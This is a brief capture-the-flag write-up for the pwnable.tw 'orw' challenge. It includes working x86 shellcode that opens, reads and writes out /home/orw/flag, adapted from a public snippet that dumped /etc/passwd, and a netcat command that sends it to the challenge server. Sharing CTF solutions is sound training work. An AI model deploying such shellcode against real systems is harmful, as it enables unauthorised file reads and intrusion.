_Read the flag from `/home/orw/flag`._

_Only open read write syscall are allowed to use._

---------------------------------------------------------------

Quick writeup, as this was a very easy exercise.

I downloaded the binary, opened it in ghidra, and realised this was a super straight-forward shellcode injection.

So I headed straight to [shell-storm.org/shellcode](http://shell-storm.org/shellcode/) and got one that did just this. The one I found dumped
`/etc/passwd`, but that sufficed for a POC ([link](http://shell-storm.org/shellcode/files/shellcode-842.php)). After that, I disassembled the shellcode,
replaced the path to mimic the path to the flag, printed it using python, and piped it into netcat.

```python
from binascii import unhexlify

shellcode = unhexlify("31C9F7E1B0055168666C6167686F72772F686F6D652F682F2F2F6889E3CD809391B00331D266BAFF0F42CD809231C0B004B301CD8093CD80")

print shellcode
```

```bash
python ./solve.py | nc chall.pwnable.tw 10001
```

Flag acquired! :)
